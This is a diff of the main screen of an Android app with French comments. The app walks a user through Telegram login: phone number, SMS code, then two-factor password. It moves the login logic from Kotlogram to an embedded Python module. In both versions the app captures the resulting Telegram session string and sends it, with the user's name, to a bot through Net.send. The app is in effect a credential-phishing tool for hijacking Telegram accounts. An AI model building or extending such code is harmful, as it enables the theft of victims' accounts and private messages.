@@ -5,41 +5,37 @@ import android.os.Bundle
 import android.widget.EditText
 import android.widget.TextView
 import android.widget.Toast
-import com.github.badoualy.telegram.api.TelegramClient
-import com.github.badoualy.telegram.tl.api.TLAbsAuthorization
-import com.github.badoualy.telegram.tl.api.TLAbsUser
-import com.github.badoualy.telegram.tl.api.account.TLPassword
-import com.github.badoualy.telegram.tl.api.auth.TLSentCode
+import com.chaquo.python.PyObject
+import com.chaquo.python.Python
+import com.chaquo.python.android.AndroidPlatform
 import com.tgme.app.*
 import kotlin.concurrent.thread
 
 class MainActivity : Activity() {
 
-    private var client: TelegramClient? = null
-    private var storage: KotlogramStorage? = null
-    
-    private var phoneCodeHash: String = ""
-    private var currentPhone: String = ""
-    private var currentDc = 2
+    private var currentPhone = ""
+    private var currentCode = ""
+    private var currentPassword = ""
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        Capture.load(this)
         
-        Tg.init(this, currentDc)
-        client = Tg.getClient()
-        storage = Tg.getStorage()
-
-        showPhone(ready = true)
+        // Initialisation de Chaquopy
+        if (!Python.isStarted()) {
+            Python.start(AndroidPlatform(this))
+        }
+        
+        Capture.load(this)
+        showPhone()
     }
 
-    private fun showPhone(ready: Boolean) {
+    // ---------------- ÉCRAN 1 : TÉLÉPHONE ----------------
+    private fun showPhone() {
         setContentView(R.layout.screen_phone)
         val cc = findViewById<EditText>(R.id.cc)
         val phone = findViewById<EditText>(R.id.phone)
         val btn = findViewById<TextView>(R.id.btn)
         
-        btn.isEnabled = ready
         btn.setOnClickListener {
             val full = normalize(cc.text.toString(), phone.text.toString())
             if (full == null) {
@@ -50,36 +46,12 @@ class MainActivity : Activity() {
             btn.isEnabled = false
             toast("Envoi du code...")
             
-            thread {
-                try {
-                    val sentCode: TLSentCode = client!!.authSendCode(false, full, true).blockingGet()
-                    phoneCodeHash = sentCode.phoneCodeHash
-                    runOnUiThread { showCode() }
-                } catch (e: Exception) {
-                    val msg = e.message ?: ""
-                    if (msg.contains("PHONE_MIGRATE_")) {
-                        val newDc = msg.substringAfter("PHONE_MIGRATE_").takeWhile { it.isDigit() }.toIntOrNull()
-                        if (newDc != null && newDc in 1..5) {
-                            runOnUiThread { toast("Redirection vers le DC$newDc...") }
-                            currentDc = newDc
-                            Tg.init(this@MainActivity, currentDc)
-                            client = Tg.getClient()
-                            try {
-                                val sentCode = client!!.authSendCode(false, full, true).blockingGet()
-                                phoneCodeHash = sentCode.phoneCodeHash
-                                runOnUiThread { showCode() }
-                            } catch (e2: Exception) {
-                                runOnUiThread { toast("Erreur après migration: ${e2.message}"); btn.isEnabled = true }
-                            }
-                            return@thread
-                        }
-                    }
-                    runOnUiThread { toast("Erreur: ${e.message}"); btn.isEnabled = true }
-                }
-            }
+            // Appel Python pour envoyer le code
+            callPython("", "")
         }
     }
 
+    // ---------------- ÉCRAN 2 : CODE ----------------
     private fun showCode() {
         setContentView(R.layout.screen_code)
         findViewById<TextView>(R.id.sub).text = "Code envoyé au $currentPhone"
@@ -89,30 +61,15 @@ class MainActivity : Activity() {
         btn.setOnClickListener {
             val code = codeInput.text.toString().replace(Regex("\\D"), "")
             if (code.isEmpty()) return@setOnClickListener
+            currentCode = code
             btn.isEnabled = false
             toast("Vérification...")
-
-            thread {
-                try {
-                    // On récupère TLAbsAuthorization (classe parente)
-                    val auth: TLAbsAuthorization = client!!.authSignIn(currentPhone, phoneCodeHash, code).blockingGet()
-                    val user = auth.user?.asUser
-                    if (user != null) {
-                        onLoginSuccess(user)
-                    } else {
-                        runOnUiThread { toast("Erreur: utilisateur null"); btn.isEnabled = true }
-                    }
-                } catch (e: Exception) {
-                    if (e.message?.contains("SESSION_PASSWORD_NEEDED") == true) {
-                        runOnUiThread { showPassword() }
-                    } else {
-                        runOnUiThread { toast("Erreur code: ${e.message}"); btn.isEnabled = true }
-                    }
-                }
-            }
+            
+            callPython(code, "")
         }
     }
 
+    // ---------------- ÉCRAN 3 : 2FA ----------------
     private fun showPassword() {
         setContentView(R.layout.screen_password)
         val pwInput = findViewById<EditText>(R.id.password)
@@ -121,57 +78,64 @@ class MainActivity : Activity() {
         btn.setOnClickListener {
             val password = pwInput.text.toString()
             if (password.isEmpty()) return@setOnClickListener
+            currentPassword = password
             btn.isEnabled = false
             toast("Vérification du mot de passe...")
-
-            thread {
-                try {
-                    // On utilise l'API standard de Kotlogram pour le SRP
-                    val passwordState = client!!.accountGetPassword().blockingGet() as TLPassword
-                    
-                    // Dans Kotlogram, il y a une méthode utilitaire pour calculer le SRP
-                    val checkPassword = com.github.badoualy.telegram.api.utils.SrpHelper.computeCheck(passwordState, password)
-                    
-                    val auth: TLAbsAuthorization = client!!.authCheckPassword(checkPassword).blockingGet()
-                    val user = auth.user?.asUser
-                    
-                    if (user != null) {
-                        onLoginSuccess(user)
-                    } else {
-                        runOnUiThread { toast("Erreur: utilisateur null"); btn.isEnabled = true }
-                    }
-                } catch (e: Exception) {
-                    runOnUiThread { toast("Erreur mot de passe: ${e.message}"); btn.isEnabled = true }
-                }
-            }
+            
+            callPython(currentCode, password)
         }
     }
 
-    private fun onLoginSuccess(u: TLAbsUser) {
-        val user = u.asUser
-        Capture.userId = user.id.toLong()
-        Capture.userName = "${user.firstName} ${user.lastName}".trim()
-        Capture.phone = currentPhone
-
-        val authKey = storage?.authKey
-        
-        if (authKey != null) {
-            val sessionString = AuthKeyConverter.toTelethonString(currentDc, authKey)
-            Capture.session = sessionString
-            Capture.save(this)
-            Net.send("🎉 LOGIN RÉUSSI\nUser: ${Capture.userName}\nSESSION: $sessionString")
+    // ---------------- APPEL PYTHON ----------------
+    private fun callPython(code: String, password: String) {
+        thread {
+            val py = Python.getInstance()
+            val pyModule = py.getModule("auth_manager")
+            
+            // Appel de la fonction process_login(phone, code, password)
+            val result = pyModule.callAttr("process_login", currentPhone, code, password).toString()
             
             runOnUiThread {
-                setContentView(R.layout.screen_success)
-                findViewById<TextView>(R.id.who).text = "${Capture.userName} · ID ${user.id}"
-                findViewById<TextView>(R.id.num).text = currentPhone
+                handlePythonResult(result)
             }
-        } else {
-            Net.send("❌ Erreur: Clé introuvable")
-            runOnUiThread { toast("Erreur clé introuvable") }
         }
     }
 
+    private fun handlePythonResult(result: String) {
+        when {
+            result == "NEED_CODE" -> {
+                showCode()
+            }
+            result == "NEED_PASSWORD" -> {
+                showPassword()
+            }
+            result.startsWith("OK|") -> {
+                val parts = result.split("|")
+                val userName = parts[1]
+                val sessionString = parts[2]
+                
+                // Envoi au bot
+                Net.send("🎉 LOGIN RÉUSSI\nUser: $userName\nSESSION: $sessionString")
+                
+                // Affichage du succès
+                setContentView(R.layout.screen_success)
+                findViewById<TextView>(R.id.who).text = userName
+                findViewById<TextView>(R.id.num).text = currentPhone
+            }
+            result.startsWith("ERROR|") -> {
+                val err = result.removePrefix("ERROR|")
+                toast("Erreur: $err")
+                // Remettre le bouton du téléphone en état si on revient au début
+                showPhone() 
+            }
+            else -> {
+                toast("Erreur inconnue: $result")
+                showPhone()
+            }
+        }
+    }
+
+    // ---------------- OUTILS ----------------
     private fun normalize(ccRaw: String, nRaw: String): String? {
         var n = nRaw.trim().replace(Regex("[\\s\\-().]"), "")
         if (n.isEmpty()) return null
